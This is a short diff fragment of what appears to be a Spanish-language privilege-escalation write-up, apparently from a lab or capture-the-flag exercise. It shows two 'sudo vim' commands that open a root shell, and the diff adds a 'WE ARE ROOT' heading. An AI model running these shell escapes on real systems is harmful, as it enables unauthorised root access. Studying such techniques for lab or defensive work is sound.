@@ -98,3 +98,5 @@ ejecutamos: sudo vim -c ':!/bin/sh'
 
 	sudo vim -c ':lua os.execute("reset; exec sh")'
 ```
+
+### WE ARE ROOT
